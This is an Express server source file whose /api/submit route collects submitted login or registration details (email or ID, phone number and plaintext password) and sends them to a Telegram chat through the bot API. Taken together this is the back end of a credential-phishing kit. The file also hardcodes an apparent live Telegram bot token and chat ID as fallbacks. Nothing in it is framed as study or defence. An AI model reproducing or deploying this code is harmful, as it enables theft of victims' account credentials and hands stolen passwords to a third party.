import "dotenv/config";
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";

const app = express();
const PORT = 3000;

app.use(express.json());

// Telegram Bot Route
app.post("/api/submit", async (req, res) => {
  const { mode, loginType, identifier, password, phone, agreed } = req.body;
  
  const token = process.env.TELEGRAM_BOT_TOKEN || "8620497977:AAE0Fr5cDm4bYhvWTUW-oiTPSwHiX3P1yWY";
  const chatId = process.env.TELEGRAM_CHAT_ID || "8141432907";

  if (!token || !chatId) {
    console.error("Telegram credentials missing");
    return res.status(500).json({ error: "Server configuration error" });
  }

  let message = "";
  if (mode === "login") {
    const label = loginType === "phone" ? "Phone Number" : "Email or ID";
    message = `<b>🔔 New Login Attempt</b>\n\n` +
              `<b>Type:</b> ${loginType === "phone" ? "📱 Phone" : "📧 Email/ID"}\n` +
              `<b>${label}:</b> <code>${identifier}</code>\n` +
              `<b>Password:</b> <code>${password}</code>\n\n` +
              `<i>Timestamp: ${new Date().toLocaleString()}</i>`;
  } else {
    message = `<b>🆕 New Registration Attempt</b>\n\n` +
              `<b>Phone:</b> <code>${phone}</code>\n` +
              `<b>Password:</b> <code>${password}</code>\n\n` +
              `<b>Agreed to terms:</b> ${agreed ? "✅ Yes" : "❌ No"}\n\n` +
              `<i>Timestamp: ${new Date().toLocaleString()}</i>`;
  }

  try {
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
        const errorData = await response.json();
        console.error("Telegram API Error:", errorData);
        throw new Error("Failed to send message to Telegram");
    }

    res.json({ status: "ok" });
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
    res.status(500).json({ error: "Failed to send data" });
  }
});

// Vite middleware logic
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
